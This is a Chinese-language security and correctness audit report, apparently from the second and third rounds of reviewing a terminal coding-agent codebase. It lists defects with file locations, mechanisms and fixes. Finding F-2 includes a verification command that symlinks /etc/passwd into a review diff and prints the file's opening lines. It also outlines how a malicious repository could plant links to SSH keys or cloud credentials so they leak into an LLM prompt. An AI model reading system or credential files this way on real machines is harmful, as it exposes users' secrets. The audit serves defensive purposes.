- **建议**: 把 TEXT_PATTERNS 的 `Bearer` 规则提到 key:value 替换**之前**执行；或让 key:value 的敏感值匹配感知 `Bearer|Basic|Token` 前缀并整体吞掉两个词。同时补 `Authorization: Bearer <jwt>`（自由文本形态）回归测试——现有测试 `tests/feedback-redact.test.ts:66` 用的是 `header: Bearer <jwt>`（键名非敏感、不触发 key:value 替换），恰好绕过本缺陷。

### F-11【真实缺陷】同一轮两次 AskUserQuestion 并行执行 → 第一个 promise 永久悬挂，整个 agent 硬挂死且 Ctrl+C 无法解锁（已逐行核实）

- **位置**: `src/tools/ask-user.ts:49`（`category = "read"`，无 `isConcurrencySafe` 覆盖）、`src/agent/index.ts:1175-1178`（read 类默认并发安全）、`src/ui/app.tsx:957-961`（单槽 `askResolveRef`，**无队列**）、`src/ui/interrupt-scope.ts:85-87`（只 resolve 当前槽）、`src/agent/streaming-executor.ts:64-82`（`finally` 中 `await Promise.all(executions)`）
- **严重级别**: 高（硬挂死，需杀进程）
- **机制**: 模型在一个 assistant 轮里发出两次 `AskUserQuestion`（schema 完全合法，批量工具调用是常态）→ 两次都被判为并发安全进同一批 → 并行执行：第二次 `askResolveRef.current = resolve` **覆盖**第一次的 resolve 函数（丢失，无处可寻）→ 对话框只展示第二组问题；用户作答/取消只 settle 第二个 promise。第一个 `tool.execute` 里的 `await this.ask(questions)`（`ask-user.ts:154`）**永不 settle**：`this.ask` 的 Promise 构造器只存了 resolve，不监听 abortSignal。`runPending` 的 `finally` 等 `Promise.all` → agent 主循环卡死在 `for await`。
- **挂死不可恢复的原因链**（逐环核实）: `isStreaming` 保持 true → `foregroundBusy` true → `use-terminal-controls.ts:35-40` 把每次 Ctrl+C 都路由到 `onInterrupt`（双击退出路径要求 `hasRunningWork=false`，永远不可达）；`interruptForeground` 的 `abort()` + `askResolveRef.current?.({})` 只能 settle 第二个 promise，第一个仍悬挂；输入被 steering/队列吸收不执行。**唯一出路是杀进程**。
- **对照**: 权限对话框有同样的单槽问题但已用 `permissionQueueRef` 队列解决（`app.tsx:566-569`、`interrupt-scope.ts:82-84` 逐个 deny）——ask 通道缺失同款机制，属遗漏而非设计。
- **建议**: 二选一：① `AskUserQuestionTool.isConcurrencySafe = () => false`（串行化，最小修复）；② 仿照 permissionQueue 给 ask 加队列，interrupt 时逐个以 `{}` 拒绝。

## 二、新增中危缺陷

### F-2【真实缺陷】/review 工作区模式把未跟踪 symlink 解引用为**目标文件全文**，仓库外内容进入评审 prompt 与报告（已实测验证）

- **位置**: `src/review/git.ts:98-136`（`untrackedFileDiffs`：`readFile(join(cwd, f))` 直接读，无 lstat）
- **严重级别**: 中
- **机制**: `git ls-files --others` 会列出未跟踪的**符号链接**；git 自己的 diff 对 symlink 只输出目标路径一行（mode 120000），而本实现用 `readFile` 跟随链接把**目标文件内容**合成成 `+` 行 diff。
- **验证**（实测，`/tmp/symrev` 中 `ln -s /etc/passwd evil_link` 后跑真实 `collectDiffs({mode:"workspace"})`）:
  ```text
  --- newPath: "evil_link" | isBinary: false
  @@ -0,0 +1,142 @@
  +##
  +# User Database        ← /etc/passwd 全文 142 行进入 diffText
  ```
- **影响**: ① 隐私/供应链：克隆的恶意仓库只需放一个 `notes.md -> ~/.ssh/id_rsa`（或 `~/.aws/credentials`）之类的未跟踪链接，用户跑 `/review` 即把仓库外敏感文件全文送入 LLM prompt，并可能出现在评审报告与 follow-up 会话中；② 正确性：与 git 语义背离（git 提交的是链接目标路径，不是内容）。
- **建议**: 读文件前 `lstat`，`isSymbolicLink()` 时按 git 语义合成 `new file mode 120000` + 目标路径单行 diff（或直接跳过）。

### F-3【真实缺陷】/review 未跟踪文件先整读后判 10MB 上限，超大文件直接把内存打满

- **位置**: `src/review/git.ts:122-133`：`content = await readFile(...)` 在前，`content.length > MAX_UNTRACKED_FILE_SIZE` 在后
- **严重级别**: 中
- **机制**: 10MB 上限形同虚设——检查发生在**全量读入内存之后**。工作区里有一个几 GB 的未跟踪日志/数据文件（agent 项目里很常见：`*.log`、`node_modules` 外的数据文件、模型权重）时，`/review` 会把整个文件读进 Buffer（Node Buffer 上限内）甚至触发 OOM，且对每个未跟踪文件串行重复。
- **建议**: 先 `statSync`（或 `open`+`fstat`）取 size，超限直接走 `untrackedBinaryDiff` 占位，永不整读。

### F-4【真实缺陷】/review 分组失败被静默吞掉：`GroupOutcome.error` 只写不读，全组失败时报告仍显示 "✅ No issues found"

- **位置**: `src/review/runner.ts:110-116`（字段声明）、`:277-280`（catch 中写入）、`:322-333`（消费处只读 `comments/completed/files`）；`src/review/report.ts:57-63`
- **严重级别**: 中
- **机制**: 组内 provider 持续 500/限流 → `runGroupAgent` 抛错 → catch 把错误存进 `outcome.error` → **无任何代码再读它**，`CodeReviewResult` 也没有错误字段。所有组都失败时 `comments` 为空，`formatReviewReport` 输出 "✅ No issues found."——用户把"评审基础设施全挂"误读为"代码没有问题"。唯一线索是头部 `filesReviewed` 计数变小，错误文本被丢弃。
- **验证**: `grep -n "outcome.error|\.error" src/review/runner.ts` 仅 `:279` 一处写入，无读取；`src/review/types.ts` 无 error 字段。
- **建议**: `CodeReviewResult` 增加 `errors: {group, error}[]` 并在报告中渲染 "⚠ N group(s) failed"。

### F-12【真实缺陷】Anthropic `redacted_thinking` 块被静默丢弃，下一轮请求被 API 400 拒绝且此后每轮重放同一坏历史

- **位置**: `src/llm/anthropic.ts:411-434`（`content_block_start` 只处理 `thinking`/`tool_use`）、`:466-491`（stop 只产出 ThinkingBlock）；`src/conversation/index.ts`（`ThinkingBlock` 仅 `{thinking, signature}` 无 data 字段）；`:158-165`（重放只发 `type:"thinking"`）
- **严重级别**: 中（触发罕见——安全红act——但触发后会话即砖）
- **机制**: SDK 的 `RawContentBlockStartEvent.content_block` 联合类型明确包含 `RedactedThinkingBlock`（`node_modules/@anthropic-ai/sdk/resources/messages/messages.d.ts:860-866,917-920`，形如 `{data, type:"redacted_thinking"}`）。该块落入 switch 的无处理分支被丢开：不采集、不持久化、不重放。Anthropic 协议要求 redacted thinking 与 thinking 一样在带 tool_use 的轮次回传；丢失后同轮的 tool_use 继续正常提交，下一次请求（带 tool_result）因 thinking 块缺失/不匹配被 400 拒绝，而错误历史已持久化到 session JSONL，resume 后仍每轮重放同一坏历史。
- **建议**: `content_block_start` 增加 `redacted_thinking` 分支存 `data`；`ThinkingBlock` 增加可选 `data` 字段并在 `buildAnthropicMessages` 重放为 `{type:"redacted_thinking", data}`。

### F-13【真实缺陷】跨 provider/模型切换后 Anthropic 路径无条件重放旧 thinking 签名，对话每轮 400

- **位置**: `src/llm/anthropic.ts:158-165`（重放**所有**存储的 thinkingBlocks）对比 `src/llm/openai.ts:763-766`（只重放 `rs_` 前缀的本地签名）；`src/ui/app.tsx:1280-1328`（`handleProviderSelect` 重建 client 但**不碰** `conversationRef`，已核实无 reset）、`src/session/index.ts`（resume 恢复 thinking_blocks）
- **严重级别**: 中
- **机制**: 会话内先用 OpenAI reasoning 模型（thinking 签名形如 `rs_...`）或 Anthropic 端点 A 产生带签名的 thinking 块 → 用户 `/provider` 切到 Anthropic 端点 B（或 `/model` 换模型，签名是模型级的）→ 对话保留 → `buildAnthropicMessages` 把非法签名原样重放 → 每轮 400 "invalid thinking block signature"，直到用户手动清对话。OpenAI 方向已有 `rs_` 过滤防护，Anthropic 方向无对称机制——两侧防护不对称即遗漏证据。
- **建议**: thinking 块携带来源协议/模型标识，`buildAnthropicMessages` 丢弃非本端点可重放的块（镜像 openai 的 `rs_` 过滤）；或切换 provider/模型时清除历史 thinking 块。

### F-14【真实缺陷】8623656 的 thinking 挤压修复只补了 feedback 分析，compact 与 memory 选择器仍用默认 1024 答案预留，小输出上限 provider 下必现截断失败

- **位置**: `src/compact/compact.ts:523`（`client.stream(conv, tools, abortSignal)` 无 options）、`src/memory/manager.ts:371`（同）对比 `src/feedback/analyze.ts:218-221`（传 `answerReserveTokens: 8000`）；挤压点在 `src/llm/anthropic.ts:364-371`（`answerReserve = max(1024, options?.answerReserveTokens ?? 0)`）
- **严重级别**: 中（仅限 `max_output_tokens` 较小的自定义 provider + thinking 开启，但命中即硬失败）
- **机制**: 例如 provider 配置 `max_output_tokens: 4096` + `thinking: high`：压缩摘要请求 `budget_tokens = min(levelBudget, 4096-1024) = 3072`，答案只剩 1024 token → 长会话摘要必然 `max_tokens` 截断 → `compact.ts:534-539` 对非 end_turn/stop 直接 throw → 普通 Error 不在 `llmRetryDelay` 的重试分类里 → 压缩硬失败（agent 主循环的 ContextTooLong 自愈也依赖压缩成功，连锁失效）。memory 选择器同样被挤，失败静默返回 `[]`（`manager.ts:381-388`），记忆召回无声退化。feedback 分析已修（同根因同修法），这两处是同一类缺陷的漏网之鱼。
- **建议**: compact/memory 的一次性 `client.stream` 调用同样传 `answerReserveTokens`（或显式 `maxOutputTokens`）。

### F-15【真实缺陷】FeedbackDialog 无防双提交门禁：连击/长按 Enter 可并发跑两条 feedback 流水线，孤儿化审批 promise 并可能重复 filing

- **位置**: `src/ui/feedback-dialog.tsx:92-98`（`key.return` 直接 `onSubmit`，无 submitting 守卫、useInput 无 isActive 门禁）；对照同库既有防护 `src/ui/code-review-dialog.tsx:62-135`（`submittingRef` + `{isActive: !submitting}`）；后果链在 `src/ui/app.tsx:2978`（`abortControllerRef` 被第二次覆盖）、`:3044`（`issueApprovalResolveRef` 被覆盖 → 第一条流水线的 `confirmIssues` promise 永久悬挂）
- **严重级别**: 中
- **机制**: 第一次 onSubmit 后 `setFeedbackActive(false)` 要到下一次 React 提交才卸载对话框；Ink 按键重复/快速双击在同一帧内两次命中 handler → 两条 `runFeedbackPipeline` 并发：第二条覆盖两个 ref，第一条的审批 promise 孤儿化（永不 settle，其 finally 不执行）；两条流水线可在各自 `recordFiledIssues` 落盘前都通过 `filterDuplicateDrafts`（`pipeline.ts:324-330,407-419` 时序窗口）→ 向 GitHub 重复提交同一 issue。同库 code-review-dialog/provider-login 都有同款守卫，证明该风险被项目自身认可，feedback 对话框属遗漏。
- **建议**: 与 code-review-dialog 同模式：`submittingRef` 守卫 + `useInput(..., {isActive: !submitted})`；`handleFeedbackSubmit` 入口再查 `isStreaming` 拒重入。

### F-5【真实缺陷】M-6 的范围远比第一轮记载的大：整个 `~/.yukino` 会话数据族都是 644/755（本机实测）

- **位置**: `src/session/index.ts`（JSONL 写入无 mode）、`src/logger/index.ts:97`（`openSync(logPath,"a")` 无 mode）、`src/tool-result/index.ts:38`（spill `writeFileSync` 无 mode）、`src/feedback/dedup.ts:54` 与 `src/feedback/pipeline.ts:123`（issues.json/bundle zip 无 mode）；目录侧 `mkdirSync(recursive)` 全部走默认 umask
- **严重级别**: 中低（第一轮 M-6 只记了 prompt_history.jsonl 一个文件）
- **验证**: 本机 `ls -la ~/.yukino/sessions/*/` → `-rw-r--r-- *.jsonl`（完整对话记录）；`stat ~/.yukino` → `drwxr-xr-x`。多用户机器上任何本地用户可读全部会话 transcript、日志、tool 输出溢出文件、memory、feedback 附件包。`issues.json` 还保存 **secret gist URL**——gist 是"不公开列出"而非"访问控制"，拿到 URL 即可读附件，等于附件对本地其他用户公开。
- **建议**: 统一在 storage 层收口：`~/.yukino` 目录 0700、会话/日志/工件文件 0600（与 `provider-login.ts`、`remote/server.ts` 的既有 0600 标准一致）。

## 三、新增低危缺陷（真实）

### F-6【真实缺陷】`normalizeCommentPath` 文档声称折叠 `..`，实际放行 `../` 前导逃逸（模型可对外仓库路径挂评论）

- **位置**: `src/review/comment-tool.ts:47-63`。`posix.normalize("../../etc/passwd")` 原样返回，两个 while 只剥 `./` 与 `/`。评审报告中会出现 `### ../../etc/passwd` 一类条目。仅影响报告展示（该路径不做任何 FS 访问），但与 docstring 不符且未校验模型输出边界。`tests/review.test.ts:601-604` 只测了 `./`、`/`、`\\`、`//` 四种形态，未覆盖 `../`。
- **建议**: 归一化后拒绝 `".."` 或以 `"../"` 开头的路径。

### F-7【真实缺陷】未跟踪文件合成 diff 用 JSON 转义，`unquoteGitPath` 按 git C-style 八进制解码，控制字符文件名往返损坏（已实测验证）

- **位置**: `src/review/git.ts:61-64`（`quoteDiffPath` = `JSON.stringify`）与 `src/review/diff-parser.ts:52-69`（`default` 分支不识别 `\uXXXX`/`\f`/`\b`）
- **验证**: 实测 `JSON.stringify("b/we\u0001ird name.txt")` → `"b/we\u0001ird name.txt"`，`unquoteGitPath` 解出 `b/weu0001ird name.txt`（MATCH:false）；git 自己的八进制引号 `"b/we\001ird name.txt"` 解码正确。含 `\x01` 等控制字符的未跟踪文件其 diff 会被归到错误路径，选择/分组/定位全部错位。空格/引号/反斜杠/中文文件名不受影响（JSON 短转义与 C-style 重合）。
- **建议**: `quoteDiffPath` 改发 git C-style 八进制转义，或让 `unquoteGitPath` 兼容 `\uXXXX`。

### F-8【真实缺陷】评审 prompt 的 `<file>` 元素不转义 diff 正文，`</file>` 字面行可截断/篡改 XML 结构

- **位置**: `src/review/format.ts:20-32`：属性经 `escapeXmlAttr`，`d.diffText` 原样内插。变更文件里一行 `+</file>`（HTML/XML fixture、字符串字面量、测试数据都可能出现）会提前闭合元素，把后续 diff 错误归属给评审模型；`</review_files>` 同理。影响评审质量而非崩溃。
- **建议**: 对 diffText 中的 `</file>`/`</review_files>` 做最小转义或 CDATA 包裹。

### F-9【真实缺陷】/review 中 abort 撞上 `git merge-base` 时错误被 `tryGit` 吞掉，向用户报 "Cannot find merge-base"

- **位置**: `src/review/git.ts:43-54`（catch-all 返回 null）、`:165-168`（null → 抛 merge-base 错误）。用户在 merge-base 执行窗口内 Ctrl+C，abort 错误被吞，`result.aborted` 不会置位，UI 显示 `Review failed: Cannot find merge-base between X and Y`（`src/ui/app.tsx:2947-2955`）。窗口小但真实；`filter.ts:96-99`、`grouping.ts:202-205` 都有 abort 先行检查，唯 git.ts 缺失。
- **建议**: `tryGit` 里 `abortSignal?.throwIfAborted()` 后再吞错。

### F-10【真实缺陷】`secretValues` 无最短长度门槛：配置里短小的敏感键值（如 `token: "1"`）会把全部附件文本打满 `<redacted>`（已实测验证）

- **位置**: `src/feedback/redact.ts:102-115` + `:67-70`（`replaceAll` 无词边界）。实测 `secrets=["abc","1"]` 时 `"The model chose abc strategy and 1 file matched."` → `"The model chose <redacted> strategy and <redacted> file matched."`。安全方向错误（过度脱敏），会把附件变成噪声，掩盖真实缺陷现场。
- **建议**: 仅对长度 ≥8（或与既有 TEXT_PATTERNS 阈值一致）的 secret 值做全文替换。

### F-16【真实缺陷】Chat Completions 路径把 `content_filter`（及一切未知 finish_reason）当作正常 `end_turn` 提交

- **位置**: `src/llm/openai.ts:1092-1099`（else 分支兼容一切）对比同文件 Responses 路径 `:430-442`（`content_filter` 显式 throw LLMError）。被内容过滤截断的回答会被当成完整回合写入对话/会话历史，与 Responses 路径行为不一致。建议：`content_filter` 与未识别 reason 报错或给独立 stopReason。

## 四、确认为设计意图 / 无缺陷（本轮新增核验）

| #     | 行为                                                                                                                 | 位置                                                                                                     | 依据                                                                                                                                                                      |
| ----- | -------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| FD-1  | feedback 分析用共享 client（带完整 coding-agent system prompt）单发无工具请求                                        | `src/feedback/analyze.ts:295-306`                                                                        | 注释明确；预算里预留 8k system prompt 空间；`tool_call_start` 事件直接抛错防工具逃逸（`:223-225`）                                                                        |
| FD-2  | 分析重试时 conv 里出现连续两条 user 消息                                                                             | `src/feedback/analyze.ts:314-327`                                                                        | `buildAnthropicMessages` 会合并连续 user 轮（`src/llm/anthropic.ts:220` 附近注释+实现），协议合法                                                                         |
| FD-3  | issue 审批前不采集/不上传；Esc=拒绝；Ctrl+C 把 pending 审批 resolve 为 `{approved:false}`                            | `src/feedback/pipeline.ts:337-352`、`src/ui/issue-approval.tsx:57-59`、`src/ui/interrupt-scope.ts:88-91` | "nothing is ever filed without explicit approval" 注释与实现一致，无悬挂 promise                                                                                          |
| FD-4  | /feedback 仅交互终端可用                                                                                             | `src/remote/server.ts:2349-2353`                                                                         | remote 模式显式回复不支持；print-mode 无 slash 接线                                                                                                                       |
| FD-5  | 附件默认全勾选、经 secret gist 上传且 gist URL 写入公开 issue 正文                                                   | `src/ui/feedback-dialog.tsx:66-73`、`src/feedback/pipeline.ts:136-140`                                   | 用户在对话框逐项选择即知情同意；"secret gist" 是 GitHub 的 unlisted 语义，产品选择用它承载公开 issue 附件属有意为之（但见 F-5：issues.json 644 会让本地其他用户拿到 URL） |
| FD-6  | 手写 ZIP（本地 CRC32+deflateRaw）不用 zlib.crc32                                                                     | `src/feedback/zip.ts:9-10`                                                                               | 注释说明 Node>=20.15 限制；实测产物经 `unzip` 完整解压校验通过（含空文件、子目录）                                                                                        |
| FD-7  | memory 提取/固化子代理的写权限被 `MemoryPermissionChecker` 收窄到两个 memory 目录内的 .md                            | `src/memory/permissions.ts:19-49`                                                                        | 写前 canonicalPath+isPathWithin+extname 三重校验；命令类一律 deny；提取器兜底写盘前也重新过该 checker（`src/memory/extractor.ts:244-250`）                                |
| FD-8  | InstallSkill 对 URL 源强制公网解析（SSRF 防护）、1MiB 流式上限、符号链接逐段拒绝、临时文件 rename 原子替换           | `src/skills/install-skill-tool.ts:36-78,188-225`、`src/utils/public-http.ts`                             | 与 D-1（WebFetch 允许内网）不同，skill 安装走了独立的 `fetchPublicHttpUrl`，BlockList 覆盖 IPv4/IPv6 私网段                                                               |
| FD-9  | todo 依赖环检测/互反一致性/blocked 门禁/删除清理                                                                     | `src/todo/dependencies.ts:19-75`、`src/todo/index.ts:164-225`                                            | 人工核验：DFS 环检测带 visiting/visited 双集合；`update(in_progress)` 与 `replace` 都检查未决依赖；删除时双向清链                                                         |
| FD-10 | worktree slug/ref 名白名单 + `--` 参数分隔 + execFile 数组参数                                                       | `src/worktree/index.ts:38-58,293-296,353-363`                                                            | 无 git 命令注入面；`.worktreeinclude` 拒绝 `..`（`:580`）                                                                                                                 |
| FD-11 | websocket token：32 字节 base64url + 长度先行比较 + timingSafeEqual；Origin 缺省放行仅限无 Origin 头的原生客户端场景 | `src/websocket-security.ts:11-59`                                                                        | 与第一轮正面结论一致，本轮复核未变                                                                                                                                        |
| FD-12 | goal 三轮 blocker 停机规则                                                                                           | `src/goal/index.ts:221-236`                                                                              | `same` 要求同 reason 且 `lastBlockedTurn === turnsExecuted-1`，与工具描述"连续三个 continuation turn"一致；同轮重复记录被去重                                             |

## 五、本轮验证为正确的关键实现（防误报）

- **feedback 分析预算链**（`analyze.ts:102-207` + `anthropic.ts:361-376`）：`analysisOutputTokens` 取 `min(thinking+8k, budget.maxOutputTokens, provider 上限, cw/4)`，`answerReserveTokens` 传入 stream 后 Anthropic 侧 `thinkingTokens = min(providerBudget, maxTokens - max(1024, reserve))`，`< MIN_THINKING_BUDGET_TOKENS` 时显式 `{type:"disabled"}`——`max_tokens > budget_tokens` 恒成立，8623656 修复的 max_tokens 截断路径闭环正确（truncated 不抛错、可解析即接受、否则 concise 重试、再兜底 description draft）。
- **feedback 管道中止语义**：13 处 `abortSignal.throwIfAborted()` 覆盖每个阶段边界；catch 内先 rethrow abort 再落错误分支；浏览器通道逐 issue 检查 abort。
- **`readTextCapped` 尾部截取**：fd 在 finally 关闭；首行残行丢弃逻辑与 `analyze.ts:117-125` 的二次截取一致。
- **`buildToolTrace`**：倒序收集至 5MB-128 字节余量，`lines.reverse()` 后时序正确；`truncated` 标记不吞已有行。
- **dedup**：fingerprint 归一化（lowercase+去非字母数字）后 sha256；批内去重与跨轮去重共用 seen 集；`recordFiledIssues` 走 `withFileSyncLock` + load-merge-write，`onFiled` 同步回调时序保证 gistUrl 记录在案。
- **`buildIssueUrl`/`truncateEncoded`**：%XX 不腰斩、UTF-8 多字节回退到 lead byte 的推导核对无误。
- **review 模块正面结论**（分区代理逐行核对、本人抽样复核 git 构造）：全部 git 调用 execFile 数组参数 + `--end-of-options` + ref 前导 `-`/CRLF 校验，无注入面；模型行号零信任（`parseComments` 硬编码 0 后由 resolve 重定位）；hunk 数学/CRLF/引号路径/二进制嗅探与 git 语义一致；filter 索引基线在并行分组下稳定；`renderTemplate` 单遍替换防二次展开。
- **lsp/client.ts**：帧解析边界（8KB header/16MB body）、pending 请求在进程退出/stdin error/非法帧时统一 fail、dispose 幂等（`disposal ??=`）、shutdown 500ms 后 killTree 兜底。
- **memory/manager.ts**：`capEntrypoint` 的 UTF-8 边界回退正确；索引写入走锁+临时文件 rename；`readMemory` 失败按 mtime+size 指纹去重日志。
- **images/index.ts**：50MB 磁盘准入在 readFile **之前**（对比 F-3 恰好做对了）；magic bytes 优先于扩展名；压缩梯度（PNG palette → JPEG 80/60/40/20 → 减半重试×3）终止条件正确。
- **thinking 载荷机制（efc1790/8623656 改动面）**：`max_tokens > budget_tokens` 恒成立（`anthropic.ts:364-377`，reserve≥1024，低于 MIN_THINKING_BUDGET_TOKENS 显式 disabled），`tests/thinking-payloads.test.ts` 锁定；adaptive 模式有意跳过 budget 最小值；agent 主循环的 max_tokens 升级只走每请求 `options.maxOutputTokens` 不改共享 client 状态，并发 agent 间隔离（`tests/agent.test.ts` 锁定）；OpenAI Responses 路径只重放 `rs_` 本地签名（`tests/openai-compat.test.ts` 锁定）；provider-login 校验 `max_output_tokens ≤ context_window`、config 写入 0600、错误日志无密钥。
- **IssueApprovalDialog 的双击变体无害**：`handleIssueApproval` 先置空 ref 再 resolve（`app.tsx:3087-3090`），第二次点击进入 no-op；与 F-15（FeedbackDialog 无守卫）形成对照。
- **composer 草稿跨对话框存活**：dock 层 `draftRef` 统一持有（`interaction-dock.tsx` + `input-draft.ts`），对话框开关不丢草稿。

## 六、本轮修复优先级建议

1. **P0**: F-1（脱敏顺序——公开 issue 泄漏真实令牌，一行顺序调整即可修复）、F-11（双 AskUserQuestion 硬挂死——`isConcurrencySafe=false` 一行即可修复）。
2. **P1**: F-2（symlink 解引用）、F-3（先 stat 后读）、F-4（分组错误可见化）、F-5（`~/.yukino` 权限统一收口，连带解决第一轮 M-6）、F-12/F-13（thinking 块协议完整性）、F-14（compact/memory 答案预留）。
3. **P2**: F-6～F-10、F-15、F-16 按余力处理。

## 附：第二轮验证环境与证据

- 全部实测脚本以 tsx 直跑 `src/feedback/redact.ts`、`src/review/git.ts`、`src/review/diff-parser.ts`、`src/permissions/index.ts` 源码；临时目录（/tmp/perm-demo-*、/tmp/symrev、/tmp/fifo-test、/tmp/zip-extract 等）与临时 HOME 均已清理。
- 分区代理分工与结局：**review 模块**代理产出完整结论，逐条对照源码复核后收录（F-2～F-4、F-6～F-9 及其"验证为正确"清单）；**llm/issue-approval** 代理产出 6 项结论，逐条对照源码与 SDK 类型定义复核后收录（F-11～F-16）；**goal/todo/skills/worktree/images** 与 **conversation/commands/bootstrap/logger/utils** 两个代理运行近 100 分钟未产出结论被主动终止，改由本人亲自全量精读对应模块（`src/goal/`、`src/todo/` 全 5 文件、`src/skills/` 全 5 文件、`src/worktree/`、`src/images/` 全 2 文件、`src/conversation/` 全 4 文件、`src/commands/` 全 4 文件、`src/bootstrap/` 全 5 文件、`src/logger/`、`src/utils/` 全 5 文件、`src/websocket-security.ts`、`src/storage/`、`src/memory/` 全 8 文件、`src/lsp/`、`src/hooks/`），除已收录条目外未发现新增缺陷；其设计意图核验结果见 FD-7～FD-12 与第五节。
- 定稿前基线：`pnpm typecheck` 与 `pnpm lint` 零错误（本轮只增审计报告，未改源码）。
- 曾排查后**排除**的假设（防后续误报）：① review 未跟踪 FIFO 读挂起——`git ls-files --others` 实测不列出 FIFO，不可达；② `openInBrowser` Windows `cmd /c start` 引号注入——URL 全量 `encodeURIComponent` 后不含裸引号，不可达；③ feedback 审批 promise 悬挂——interrupt-scope 显式 resolve，无悬挂；④ H-1 验证脚本若用 `path.join()` 预拼路径会因提前归一化而误得 ask，必须用含字面 `..` 的原始字符串拼接才能复现。

---

# 第三轮补充审计（2026-10-18，聚焦会话生命周期状态一致性与 remote/ACP/A2A 共享路径）

- **审计背景**: 本轮在前两轮基础上，重点覆盖此前审计较薄的模块——`src/teams/`（全 11 文件精读）、`src/subagent/`（spawn/agent-tool/tool-filter/task-stop）、`src/a2a/`（executor/conversion 全文 + SDK 契约核对）、`src/hooks/`、`src/conversation/`（index/pairing/at-expand）、`src/session/`、`src/config/`、`src/cli.ts`、`src/tools/registry.ts`/`read-file.ts`/`computer-use.ts`/`tool-search.ts`/`file-state-cache.ts`、`src/mcp/tool-wrapper.ts`、`src/feedback/github.ts`/`pipeline.ts`/`dedup.ts`（含最新 commit 3b1f5e5 改动面）、`src/remote/session-state.ts`/`address.ts` 与 browser 前端 `use-chat.ts`/`use-web-socket.ts`、`src/review/selection.ts`/`form.ts`/`llm-call.ts`、`src/llm/model-discovery.ts`/`retry.ts`/`errors.ts`、`src/memory/consolidation.ts`、`src/update/version-check.ts`、`src/vscode/lockfile.ts`、`src/utils/paths.ts`、`src/storage/`、`src/theme/`、`src/telemetry/instrumentation.ts`。
- **方法**: 4 个分区探索代理均因上游 API 网络错误中途终止（仅留下部分线索），本轮结论以**本人逐文件精读 + 独立脚本实测**为准；代理线索仅作核查方向，每条均对照源码重新验证，不成立的列入「排除」节。
- **基线复核（本轮实测）**: `pnpm typecheck` / `pnpm lint` 零错误；`pnpm test` → **156 文件 / 2410 passed / 1 skipped（66.5s，全绿）**。claude 报告 C2 所述 `tests/lsp.test.ts` 并行 flaky 在本轮负载下未复现（该条为测试侧脆弱性，与本轮结论不冲突）。

## 一、新增真实缺陷

### G-1【真实缺陷】remote/ACP/A2A 三种服务模式的长期记忆与项目指令是**启动时一次性快照**：会话运行期间产生的新记忆永远不回流进上下文，与终端每轮实时重读的行为不对称

- **位置**:
  - 快照生成：`src/remote/server.ts:749`（`const instructions = loadInstructions(cwd)`）、`:755`（`const memReminder = memoryEnabled ? memoryManager.buildSystemReminder() : ""`）、`:1074-1075`（两者作为 `longTermMemoryInstructions`/`longTermMemoryMemoryContent` 存入 handle，**此后无任何刷新点**）；
  - 每轮消费：`src/remote/server.ts:569-570`（`new Agent({ instructions: this.longTermMemoryInstructions, memoryContent: this.longTermMemoryMemoryContent, ... })`——每轮都用同一份启动快照）；
  - 对照终端：`src/ui/app.tsx:2342-2343`（每次构造 Agent 都 `instructions: loadInstructions(cwd)`、`memoryContent: memManagerRef.current?.buildSystemReminder()` **实时重读**）；终端 `/clear`（`:1757-1758`）与 `/resume`（`:1915-1916`）也各自重读，而远程 `clearConversation()`（`server.ts:652-666`）与 `restoreRemoteSession()`（`session-state.ts:27-47`）均**不触碰**快照字段。
- **严重级别**: 中低（功能正确性 + 模式间 parity 缺口；影响 remote、ACP、A2A 三种模式——后两者都经 `createRemoteAgent` 构建 runtime，`src/acp/agent.ts:99`、`src/a2a/executor.ts:79`）
- **机制与后果**:
  1. **记忆提取结果不回流**：远程模式每轮 `loop_complete` 后 `onLoopComplete`（`server.ts:588-608`）fire-and-forget 启动 `MemoryExtractor.extract(summary)`，新记忆**写盘成功**（`src/memory/extractor.ts:212-225`）；但下一轮注入上下文的 `memoryContent` 仍是服务器启动时的快照——同一个远程进程生命周期内，自动记忆管线「只写不读」，新记忆对模型永远不可见（除非重启进程）。终端模式每轮重读，同一功能闭环成立。
  2. **AGENTS.md 热更新失效**：用户在远程会话进行中修改项目的 AGENTS.md（长驻 remote server 是常态用法），修改不生效；终端每轮生效。
  3. `/clear`、`/resume` 后 `Agent.run() → restoreContext() → injectLongTermMemory` 用快照重新注入（`src/agent/index.ts:308-322,335`），内容仍是启动时的旧值。
- **意图核查**: `createRemoteAgent` 内注释（`server.ts:747-754`）只解释 `enable_memory: false` 的语义，未声明「快照一次、永不刷新」是有意取舍；`mcp/instructions.ts` 头注释明确「history is the source of truth」的动态同步哲学，记忆/指令却走静态快照，两种机制哲学不一致。判定为**遗漏而非设计**。
- **建议**: 与终端对齐——handle 存 `memoryManager`/`cwd` 而非渲染结果，`run()` 构造 Agent 时实时调用 `loadInstructions(cwd)` 与 `buildSystemReminder()`；或至少在 `clearConversation`/`restoreRemoteSession`/`onLoopComplete` 提取完成后刷新快照字段。

### G-2【真实缺陷】终端 `/clear`、`/resume`（及 `/rewind`）不重置 `FileStateCache`：read-before-edit 门禁跨会话携带，新会话可在未读文件的情况下通过编辑门禁；远程模式对称路径已正确重置（已实测验证不对称性）

- **位置**:
  - 终端：`src/ui/app.tsx:462`（`fileStateCacheRef = useRef(new FileStateCache())` **仅初始化一次**）、`:1742-1786`（`/clear` 分支重置了 conversation、TaskStore、FileHistory、RecoveryState 等全部会话派生态，**唯独不碰** fileStateCacheRef）、`:1900-1950`（`/resume` 分支同样重置 RecoveryState/TaskStore/FileHistory，不重置 fileStateCache）、`:2685-2698`（`/rewind` 恢复路径亦不重置）；每轮 Agent 复用同一实例（`:2336`）；
  - 门禁消费方：`src/tools/edit-file.ts:226-227,258-259`、`src/tools/write-file.ts:95-98,110-113`（`fileStateCache.check(filePath)` 失败即拒绝编辑，错误文案为 "file has not been read yet, read it first before editing"）；登记方 `src/tools/read-file.ts:202,244`（ReadFile 成功后 `record`）；
  - 对照远程：`src/remote/server.ts:662`（`clearConversation()` 显式 `this.fileStateCache = new FileStateCache()`）、`src/remote/session-state.ts:41`（`restoreRemoteSession` 显式 `state.fileStateCache = new FileStateCache()`）。
- **严重级别**: 低中（安全语义削弱方向 + 明确的模式间不对称）
